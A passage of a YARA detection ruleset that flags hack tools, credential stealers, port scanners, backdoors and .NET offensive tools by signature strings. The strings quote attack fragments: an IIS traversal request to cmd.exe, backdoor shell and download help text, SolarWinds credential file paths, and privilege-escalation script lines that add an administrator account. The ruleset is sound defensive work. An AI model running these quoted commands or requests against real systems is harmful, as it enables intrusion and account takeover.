        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/brandonprry/gray_hat_csharp_code"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "gray_hat_csharp_code" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_NativePayload_ReverseShell {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/DamonMohammadbagher/NativePayload_ReverseShell"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "NativePayload_ReverseShell" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_DotNetAVBypass {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/mandreko/DotNetAVBypass"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "DotNetAVBypass" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_HexyRunner {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/bao7uo/HexyRunner"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "HexyRunner" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_SharpOffensiveShell {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/darkr4y/SharpOffensiveShell"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "SharpOffensiveShell" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_reconness {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/reconness/reconness"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "reconness" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_tvasion {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/loadenmb/tvasion"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "tvasion" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_ibombshell {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/Telefonica/ibombshell"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "ibombshell" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_RemoteProcessInjection {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/Mr-Un1k0d3r/RemoteProcessInjection"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "RemoteProcessInjection" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_njRAT_0_7d_Stub_CSharp {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/NYAN-x-CAT/njRAT-0.7d-Stub-CSharp"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "njRAT-0.7d-Stub-CSharp" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_CACTUSTORCH {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/mdsecactivebreach/CACTUSTORCH"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "CACTUSTORCH" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_PandaSniper {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/QAX-A-Team/PandaSniper"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "PandaSniper" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_xbapAppWhitelistBypassPOC {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/jpginc/xbapAppWhitelistBypassPOC"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "xbapAppWhitelistBypassPOC" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_StageStrike {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/RedXRanger/StageStrike"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "StageStrike" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or
    organization, as long as you use it under this license.
*/

rule HKTL_Solarwinds_credential_stealer {
    meta:
        description = "Detects solarwinds credential stealers like e.g. solarflare via the touched certificate, files and database columns"
        reference = "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/solarwinds-raindrop-malware"
        reference = "https://github.com/mubix/solarflare"
        author = "Arnim Rupp"
        date = "2021-01-20"
		hash = "1b2e5186464ed0bdd38fcd9f4ab294a7ba28bd829bf296584cbc32e2889037e4"
		hash = "4adb69d4222c80d97f8d64e4d48b574908a518f8d504f24ce93a18b90bd506dc"
    strings:
        $certificate = "CN=SolarWinds-Orion" ascii nocase wide
        $credfile1 = "\\CredentialStorage\\SolarWindsDatabaseAccessCredential" ascii nocase wide
        $credfile2 = "\\KeyStorage\\CryptoHelper\\default.dat" ascii nocase wide
        $credfile3 = "\\Orion\\SWNetPerfMon.DB" ascii nocase wide
        $credfile4 = "\\Orion\\RabbitMQ\\.erlang.cookie" ascii nocase wide
        $sql1 = "encryptedkey" ascii nocase wide fullword
        $sql2 = "protectiontype" ascii nocase wide fullword
        $sql3 = "CredentialProperty" ascii nocase wide fullword
        $sql4 = "passwordhash" ascii nocase wide fullword
        $sql5 = "credentialtype" ascii nocase wide fullword
        $sql6 = "passwordsalt" ascii nocase wide fullword
    condition:
        uint16(0) == 0x5A4D and $certificate and ( 2 of ( $credfile* ) or 5 of ( $sql* ) )
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

/*

   THOR APT Scanner - Hack Tool Extract
   This rulset is a subset of all hack tool rules included in our
   APT Scanner THOR - the full featured APT scanner.

   We will frequently update this file with new rules rated TLP:WHITE

   Florian Roth
   BSK Consulting GmbH
   Web: bsk-consulting.de

   revision: 20150510

   License: Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)
	Copyright and related rights waived via https://creativecommons.org/licenses/by-nc-sa/4.0/

*/

/* WCE */

rule WindowsCredentialEditor
{
    meta:
    	description = "Windows Credential Editor" threat_level = 10 score = 90
    strings:
		$a = "extract the TGT session key"
		$b = "Windows Credentials Editor"
    condition:
    	$a or $b
}

rule Amplia_Security_Tool
{
    meta:
		description = "Amplia Security Tool"
		score = 60
		nodeepdive = 1
    strings:
		$a = "Amplia Security"
		$b = "Hernan Ochoa"
		$c = "getlsasrvaddr.exe"
		$d = "Cannot get PID of LSASS.EXE"
		$e = "extract the TGT session key"
		$f = "PPWDUMP_DATA"
    condition: 1 of them
}

/* pwdump/fgdump */

rule PwDump
{
	meta:
		description = "PwDump 6 variant"
		author = "Marc Stroebel"
		date = "2014-04-24"
		score = 70
	strings:
		$s5 = "Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineNa"
		$s6 = "Unable to query service status. Something is wrong, please manually check the st"
		$s7 = "pwdump6 Version %s by fizzgig and the mighty group at foofus.net" fullword
	condition:
		all of them
}

rule PScan_Portscan_1 {
	meta:
		description = "PScan - Port Scanner"
		author = "F. Roth"
		score = 50
	strings:
		$a = "00050;0F0M0X0a0v0}0"
		$b = "vwgvwgvP76"
		$c = "Pr0PhOFyP"
	condition:
		all of them
}

rule HackTool_Samples {
	meta:
		description = "Hacktool"
		score = 50
	strings:
		$a = "Unable to uninstall the fgexec service"
		$b = "Unable to set socket to sniff"
		$c = "Failed to load SAM functions"
		$d = "Dump system passwords"
		$e = "Error opening sam hive or not valid file"
		$f = "Couldn't find LSASS pid"
		$g = "samdump.dll"
		$h = "WPEPRO SEND PACKET"
		$i = "WPE-C1467211-7C89-49c5-801A-1D048E4014C4"
		$j = "Usage: unshadow PASSWORD-FILE SHADOW-FILE"
		$k = "arpspoof\\Debug"
		$l = "Success: The log has been cleared"
		$m = "clearlogs [\\\\computername"
		$n = "DumpUsers 1."
		$o = "dictionary attack with specified dictionary file"
		$p = "by Objectif Securite"
		$q = "objectif-securite"
		$r = "Cannot query LSA Secret on remote host"
		$s = "Cannot write to process memory on remote host"
		$t = "Cannot start PWDumpX service on host"
		$u = "usage: %s <system hive> <security hive>"
		$v = "username:domainname:LMhash:NThash"
		$w = "<server_name_or_ip> | -f <server_list_file> [username] [password]"
		$x = "Impersonation Tokens Available"
		$y = "failed to parse pwdump format string"
		$z = "Dumping password"
	condition:
		1 of them
}

/* Disclosed hack tool set */

rule Fierce2
{
	meta:
		author = "Florian Roth"
		description = "This signature detects the Fierce2 domain scanner"
		date = "07/2014"
		score = 60
	strings:
		$s1 = "$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars,"
	condition:
		1 of them
}

rule Ncrack
{
	meta:
		author = "Florian Roth"
		description = "This signature detects the Ncrack brute force tool"
		date = "07/2014"
		score = 60
	strings:
		$s1 = "NcrackOutputTable only supports adding up to 4096 to a cell via"
	condition:
		1 of them
}

rule SQLMap
{
	meta:
		author = "Florian Roth"
		description = "This signature detects the SQLMap SQL injection tool"
		date = "07/2014"
		score = 60
	strings:
		$s1 = "except SqlmapBaseException, ex:"
	condition:
		1 of them
}

rule PortScanner {
	meta:
		description = "Auto-generated rule on file PortScanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "b381b9212282c0c650cb4b0323436c63"
	strings:
		$s0 = "Scan Ports Every"
		$s3 = "Scan All Possible Ports!"
	condition:
		all of them
}

rule DomainScanV1_0 {
	meta:
		description = "Auto-generated rule on file DomainScanV1_0.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "aefcd73b802e1c2bdc9b2ef206a4f24e"
	strings:
		$s0 = "dIJMuX$aO-EV"
		$s1 = "XELUxP\"-\\"
		$s2 = "KaR\"U'}-M,."
		$s3 = "V.)\\ZDxpLSav"
		$s4 = "Decompress error"
		$s5 = "Can't load library"
		$s6 = "Can't load function"
		$s7 = "com0tl32:.d"
	condition:
		all of them
}

rule MooreR_Port_Scanner {
	meta:
		description = "Auto-generated rule on file MooreR Port Scanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "376304acdd0b0251c8b19fea20bb6f5b"
	strings:
		$s0 = "Description|"
		$s3 = "soft Visual Studio\\VB9yp"
		$s4 = "adj_fptan?4"
		$s7 = "DOWS\\SyMem32\\/o"
	condition:
		all of them
}

rule NetBIOS_Name_Scanner {
	meta:
		description = "Auto-generated rule on file NetBIOS Name Scanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "888ba1d391e14c0a9c829f5a1964ca2c"
	strings:
		$s0 = "IconEx"
		$s2 = "soft Visual Stu"
		$s4 = "NBTScanner!y&"
	condition:
		all of them
}

rule FeliksPack3___Scanners_ipscan {
	meta:
		description = "Auto-generated rule on file ipscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "6c1bcf0b1297689c8c4c12cc70996a75"
	strings:
		$s2 = "WCAP;}ECTED"
		$s4 = "NotSupported"
		$s6 = "SCAN.VERSION{_"
	condition:
		all of them
}

rule CGISscan_CGIScan {
	meta:
		description = "Auto-generated rule on file CGIScan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "338820e4e8e7c943074d5a5bc832458a"
	strings:
		$s1 = "Wang Products" fullword wide
		$s2 = "WSocketResolveHost: Cannot convert host address '%s'"
		$s3 = "tcp is the only protocol supported thru socks server"
	condition:
		all of ($s*)
}

rule IP_Stealing_Utilities {
	meta:
		description = "Auto-generated rule on file IP Stealing Utilities.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "65646e10fb15a2940a37c5ab9f59c7fc"
	strings:
		$s0 = "DarkKnight"
		$s9 = "IPStealerUtilities"
	condition:
		all of them
}

rule SuperScan4 {
	meta:
		description = "Auto-generated rule on file SuperScan4.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "78f76428ede30e555044b83c47bc86f0"
	strings:
		$s2 = " td class=\"summO1\">"
		$s6 = "REM'EBAqRISE"
		$s7 = "CorExitProcess'msc#e"
	condition:
		all of them

}
rule PortRacer {
	meta:
		description = "Auto-generated rule on file PortRacer.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "2834a872a0a8da5b1be5db65dfdef388"
	strings:
		$s0 = "Auto Scroll BOTH Text Boxes"
		$s4 = "Start/Stop Portscanning"
		$s6 = "Auto Save LogFile by pressing STOP"
	condition:
		all of them
}

rule scanarator {
	meta:
		description = "Auto-generated rule on file scanarator.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "848bd5a518e0b6c05bd29aceb8536c46"
	strings:
		$s4 = "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"
	condition:
		all of them
}

rule aolipsniffer {
	meta:
		description = "Auto-generated rule on file aolipsniffer.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "51565754ea43d2d57b712d9f0a3e62b8"
	strings:
		$s0 = "C:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB"
		$s1 = "dwGetAddressForObject"
		$s2 = "Color Transfer Settings"
		$s3 = "FX Global Lighting Angle"
		$s4 = "Version compatibility info"
		$s5 = "New Windows Thumbnail"
		$s6 = "Layer ID Generator Base"
		$s7 = "Color Halftone Settings"
		$s8 = "C:\\WINDOWS\\SYSTEM\\MSWINSCK.oca"
	condition:
		all of them
}

rule _Bitchin_Threads_ {
	meta:
		description = "Auto-generated rule on file =Bitchin Threads=.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "7491b138c1ee5a0d9d141fbfd1f0071b"
	strings:
		$s0 = "DarKPaiN"
		$s1 = "=BITCHIN THREADS"
	condition:
		all of them
}

rule cgis4_cgis4 {
	meta:
		description = "Auto-generated rule on file cgis4.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "d658dad1cd759d7f7d67da010e47ca23"
	strings:
		$s0 = ")PuMB_syJ"
		$s1 = "&,fARW>yR"
		$s2 = "m3hm3t_rullaz"
		$s3 = "7Projectc1"
		$s4 = "Ten-GGl\""
		$s5 = "/Moziqlxa"
	condition:
		all of them
}

rule portscan {
	meta:
		description = "Auto-generated rule on file portscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "a8bfdb2a925e89a281956b1e3bb32348"
	strings:
		$s5 = "0    :SCAN BEGUN ON PORT:"
		$s6 = "0    :PORTSCAN READY."
	condition:
		all of them
}

rule ProPort_zip_Folder_ProPort {
	meta:
		description = "Auto-generated rule on file ProPort.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "c1937a86939d4d12d10fc44b7ab9ab27"
	strings:
		$s0 = "Corrupt Data!"
		$s1 = "K4p~omkIz"
		$s2 = "DllTrojanScan"
		$s3 = "GetDllInfo"
		$s4 = "Compressed by Petite (c)1999 Ian Luck."
		$s5 = "GetFileCRC32"
		$s6 = "GetTrojanNumber"
		$s7 = "TFAKAbout"
	condition:
		all of them
}

rule StealthWasp_s_Basic_PortScanner_v1_2 {
	meta:
		description = "Auto-generated rule on file StealthWasp's Basic PortScanner v1.2.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "7c0f2cab134534cd35964fe4c6a1ff00"
	strings:
		$s1 = "Basic PortScanner"
		$s6 = "Now scanning port:"
	condition:
		all of them
}

rule BluesPortScan {
	meta:
		description = "Auto-generated rule on file BluesPortScan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "6292f5fc737511f91af5e35643fc9eef"
	strings:
		$s0 = "This program was made by Volker Voss"
		$s1 = "JiBOo~SSB"
	condition:
		all of them
}

rule scanarator_iis {
	meta:
		description = "Auto-generated rule on file iis.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "3a8fc02c62c8dd65e038cc03e5451b6e"
	strings:
		$s0 = "example: iis 10.10.10.10"
		$s1 = "send error"
	condition:
		all of them
}

rule stealth_Stealth {
	meta:
		description = "Auto-generated rule on file Stealth.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "8ce3a386ce0eae10fc2ce0177bbc8ffa"
	strings:
		$s3 = "<table width=\"60%\" bgcolor=\"black\" cellspacing=\"0\" cellpadding=\"2\" border=\"1\" bordercolor=\"white\"><tr><td>"
		$s6 = "This tool may be used only by system administrators. I am not responsible for "
	condition:
		all of them
}

rule Angry_IP_Scanner_v2_08_ipscan {
	meta:
		description = "Auto-generated rule on file ipscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "70cf2c09776a29c3e837cb79d291514a"
	strings:
		$s0 = "_H/EnumDisplay/"
		$s5 = "ECTED.MSVCRT0x"
		$s8 = "NotSupported7"
	condition:
		all of them
}

rule crack_Loader {
	meta:
		description = "Auto-generated rule on file Loader.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "f4f79358a6c600c1f0ba1f7e4879a16d"
	strings:
		$s0 = "NeoWait.exe"
		$s1 = "RRRRRRRW"
	condition:
		all of them
}

rule CN_GUI_Scanner {
	meta:
		description = "Detects an unknown GUI scanner tool - CN background"
		author = "Florian Roth"
		hash = "3c67bbb1911cdaef5e675c56145e1112"
		score = 65
		date = "04.10.2014"
	strings:
		$s1 = "good.txt" fullword ascii
		$s2 = "IP.txt" fullword ascii
		$s3 = "xiaoyuer" fullword ascii
		$s0w = "ssh(" fullword wide
		$s1w = ").exe" fullword wide
	condition:
		all of them
}

rule CN_Packed_Scanner {
	meta:
		description = "Suspiciously packed executable"
		author = "Florian Roth"
		hash = "6323b51c116a77e3fba98f7bb7ff4ac6"
		score = 40
		date = "06.10.2014"
	strings:
		$s1 = "kernel32.dll" fullword ascii
		$s2 = "CRTDLL.DLL" fullword ascii
		$s3 = "__GetMainArgs" fullword ascii
		$s4 = "WS2_32.DLL" fullword ascii
	condition:
		all of them and filesize < 180KB and filesize > 70KB
}

rule Tiny_Network_Tool_Generic {
	meta:
		description = "Tiny tool with suspicious function imports. (Rule based on WinEggDrop Scanner samples)"
		author = "Florian Roth"
		date = "08.10.2014"
		score = 40
		type = "file"
		hash0 = "9e1ab25a937f39ed8b031cd8cfbc4c07"
		hash1 = "cafc31d39c1e4721af3ba519759884b9"
		hash2 = "8e635b9a1e5aa5ef84bfa619bd2a1f92"
	strings:
		$magic	= { 4d 5a }

		$s0 = "KERNEL32.DLL" fullword ascii
		$s1 = "CRTDLL.DLL" fullword ascii
		$s3 = "LoadLibraryA" fullword ascii
		$s4 = "GetProcAddress" fullword ascii

		$y1 = "WININET.DLL" fullword ascii
		$y2 = "atoi" fullword ascii

		$x1 = "ADVAPI32.DLL" fullword ascii
		$x2 = "USER32.DLL" fullword ascii
		$x3 = "wsock32.dll" fullword ascii
		$x4 = "FreeSid" fullword ascii
		$x5 = "atoi" fullword ascii

		$z1 = "ADVAPI32.DLL" fullword ascii
		$z2 = "USER32.DLL" fullword ascii
		$z3 = "FreeSid" fullword ascii
		$z4 = "ToAscii" fullword ascii

	condition:
		( $magic at 0 ) and all of ($s*) and ( all of ($y*) or all of ($x*) or all of ($z*) ) and filesize < 15KB
}

rule Beastdoor_Backdoor {
	meta:
		description = "Detects the backdoor Beastdoor"
		author = "Florian Roth"
		score = 55
		hash = "5ab10dda548cb821d7c15ebcd0a9f1ec6ef1a14abcc8ad4056944d060c49535a"
	strings:
		$s0 = "Redirect SPort RemoteHost RPort  -->Port Redirector" fullword
		$s1 = "POST /scripts/WWPMsg.dll HTTP/1.0" fullword
		$s2 = "http://IP/a.exe a.exe            -->Download A File" fullword
		$s7 = "Host: wwp.mirabilis.com:80" fullword
		$s8 = "%s -Set Port PortNumber              -->Set The Service Port" fullword
		$s11 = "Shell                            -->Get A Shell" fullword
		$s14 = "DeleteService ServiceName        -->Delete A Service" fullword
		$s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword
		$s17 = "%s -Set ServiceName ServiceName      -->Set The Service Name" fullword
	condition:
		2 of them
}

rule Powershell_Netcat {
	meta:
		description = "Detects a Powershell version of the Netcat network hacking tool"
		author = "Florian Roth"
		score = 60
		date = "10.10.2014"
	strings:
		$s0 = "[ValidateRange(1, 65535)]" fullword
		$s1 = "$Client = New-Object -TypeName System.Net.Sockets.TcpClient" fullword
		$s2 = "$Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize" fullword
	condition:
		all of them
}

rule Chinese_Hacktool_1014 {
	meta:
		description = "Detects a chinese hacktool with unknown use"
		author = "Florian Roth"
		score = 60
		date = "10.10.2014"
		hash = "98c07a62f7f0842bcdbf941170f34990"
	strings:
		$s0 = "IEXT2_IDC_HORZLINEMOVECURSOR" fullword wide
		$s1 = "msctls_progress32" fullword wide
		$s2 = "Reply-To: %s" fullword ascii
		$s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii
		$s4 = "html htm htx asp" fullword ascii
	condition:
		all of them
}

rule CN_Hacktool_BAT_PortsOpen {
	meta:
		description = "Detects a chinese BAT hacktool for local port evaluation"
		author = "Florian Roth"
		score = 60
		date = "12.10.2014"
	strings:
		$s0 = "for /f \"skip=4 tokens=2,5\" %%a in ('netstat -ano -p TCP') do (" ascii
		$s1 = "in ('tasklist /fi \"PID eq %%b\" /FO CSV') do " ascii
		$s2 = "@echo off" ascii
	condition:
		all of them
}

rule CN_Hacktool_SSPort_Portscanner {
	meta:
		description = "Detects a chinese Portscanner named SSPort"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "Golden Fox" fullword wide
		$s1 = "Syn Scan Port" fullword wide
		$s2 = "CZ88.NET" fullword wide
	condition:
		all of them
}

rule CN_Hacktool_ScanPort_Portscanner {
	meta:
		description = "Detects a chinese Portscanner named ScanPort"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "LScanPort" fullword wide
		$s1 = "LScanPort Microsoft" fullword wide
		$s2 = "www.yupsoft.com" fullword wide
	condition:
		all of them
}

rule CN_Hacktool_S_EXE_Portscanner {
	meta:
		description = "Detects a chinese Portscanner named s.exe"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "\\Result.txt" fullword ascii
		$s1 = "By:ZT QQ:376789051" fullword ascii
		$s2 = "(http://www.eyuyan.com)" fullword wide
	condition:
		all of them
}

rule CN_Hacktool_MilkT_BAT {
	meta:
		description = "Detects a chinese Portscanner named MilkT - shipped BAT"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" ascii
		$s1 = "if not \"%Choice%\"==\"\" set Choice=%Choice:~0,1%" ascii
	condition:
		all of them
}

rule CN_Hacktool_MilkT_Scanner {
	meta:
		description = "Detects a chinese Portscanner named MilkT"
		author = "Florian Roth"
		score = 60
		date = "12.10.2014"
	strings:
		$s0 = "Bf **************" ascii fullword
		$s1 = "forming Time: %d/" ascii
		$s2 = "KERNEL32.DLL" ascii fullword
		$s3 = "CRTDLL.DLL" ascii fullword
		$s4 = "WS2_32.DLL" ascii fullword
		$s5 = "GetProcAddress" ascii fullword
		$s6 = "atoi" ascii fullword
	condition:
		all of them
}

rule CN_Hacktool_1433_Scanner {
	meta:
		description = "Detects a chinese MSSQL scanner"
		author = "Florian Roth"
		score = 40
		date = "12.10.2014"
	strings:
		$magic = { 4d 5a }
		$s0 = "1433" wide fullword
		$s1 = "1433V" wide
		$s2 = "del Weak1.txt" ascii fullword
		$s3 = "del Attack.txt" ascii fullword
		$s4 = "del /s /Q C:\\Windows\\system32\\doors\\" fullword ascii
		$s5 = "!&start iexplore http://www.crsky.com/soft/4818.html)" fullword ascii
	condition:
		( $magic at 0 ) and all of ($s*)
}

rule CN_Hacktool_1433_Scanner_Comp2 {
	meta:
		description = "Detects a chinese MSSQL scanner - component 2"
		author = "Florian Roth"
		score = 40
		date = "12.10.2014"
	strings:
		$magic = { 4d 5a }
		$s0 = "1433" wide fullword
		$s1 = "1433V" wide
		$s2 = "UUUMUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUMUUU" ascii fullword
	condition:
		( $magic at 0 ) and all of ($s*)
}

rule WCE_Modified_1_1014 {
	meta:
		description = "Modified (packed) version of Windows Credential Editor"
		author = "Florian Roth"
		hash = "09a412ac3c85cedce2642a19e99d8f903a2e0354"
		score = 70
	strings:
		$s0 = "LSASS.EXE" fullword ascii
		$s1 = "_CREDS" ascii
		$s9 = "Using WCE " ascii
	condition:
		all of them
}

rule ReactOS_cmd_valid {
	meta:
		description = "ReactOS cmd.exe with correct file name - maybe packed with software or part of hacker toolset"
		author = "Florian Roth"
		date = "05.11.14"
		reference = "http://www.elifulkerson.com/articles/suzy-sells-cmd-shells.php"
		score = 30
		hash = "b88f050fa69d85af3ff99af90a157435296cbb6e"
	strings:
		$s1 = "ReactOS Command Processor" fullword wide
		$s2 = "Copyright (C) 1994-1998 Tim Norman and others" fullword wide
		$s3 = "Eric Kohl and others" fullword wide
		$s4 = "ReactOS Operating System" fullword wide
	condition:
		all of ($s*)
}

rule iKAT_wmi_rundll {
	meta:
		description = "This exe will attempt to use WMI to Call the Win32_Process event to spawn rundll - file wmi_rundll.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 65
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "97c4d4e6a644eed5aa12437805e39213e494d120"
	strings:
		$s0 = "This operating system is not supported." fullword ascii
		$s1 = "Error!" fullword ascii
		$s2 = "Win32 only!" fullword ascii
		$s3 = "COMCTL32.dll" fullword ascii
		$s4 = "[LordPE]" ascii
		$s5 = "CRTDLL.dll" fullword ascii
		$s6 = "VBScript" fullword ascii
		$s7 = "CoUninitialize" fullword ascii
	condition:
		all of them and filesize < 15KB
}

rule iKAT_revelations {
	meta:
		description = "iKAT hack tool showing the content of password fields - file revelations.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 75
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "c4e217a8f2a2433297961561c5926cbd522f7996"
	strings:
		$s0 = "The RevelationHelper.DLL file is corrupt or missing." fullword ascii
		$s8 = "BETAsupport@snadboy.com" fullword wide
		$s9 = "support@snadboy.com" fullword wide
		$s14 = "RevelationHelper.dll" fullword ascii
	condition:
		all of them
}

rule iKAT_priv_esc_tasksch {
	meta:
		description = "Task Schedulder Local Exploit - Windows local priv-esc using Task Scheduler, published by webDevil. Supports Windows 7 and Vista."
		author = "Florian Roth"
		date = "05.11.14"
		score = 75
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "84ab94bff7abf10ffe4446ff280f071f9702cf8b"
	strings:
		$s0 = "objShell.Run \"schtasks /change /TN wDw00t /disable\",,True" fullword ascii
		$s3 = "objShell.Run \"schtasks /run /TN wDw00t\",,True" fullword ascii
		$s4 = "'objShell.Run \"cmd /c copy C:\\windows\\system32\\tasks\\wDw00t .\",,True" fullword ascii
		$s6 = "a.WriteLine (\"schtasks /delete /f /TN wDw00t\")" fullword ascii
		$s7 = "a.WriteLine (\"net user /add ikat ikat\")" fullword ascii
		$s8 = "a.WriteLine (\"cmd.exe\")" fullword ascii
		$s9 = "strFileName=\"C:\\windows\\system32\\tasks\\wDw00t\"" fullword ascii
		$s10 = "For n = 1 To (Len (hexXML) - 1) step 2" fullword ascii
		$s13 = "output.writeline \" Should work on Vista/Win7/2008 x86/x64\"" fullword ascii
		$s11 = "Set objExecObject = objShell.Exec(\"cmd /c schtasks /query /XML /TN wDw00t\")" fullword ascii
		$s12 = "objShell.Run \"schtasks /create /TN wDw00t /sc monthly /tr \"\"\"+biatchFile+\"" ascii
		$s14 = "a.WriteLine (\"net localgroup administrators /add v4l\")" fullword ascii
		$s20 = "Set ts = fso.createtextfile (\"wDw00t.xml\")" fullword ascii
	condition:
		2 of them
}

rule iKAT_command_lines_agent {
	meta:
		description = "iKAT hack tools set agent - file ikat.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 75
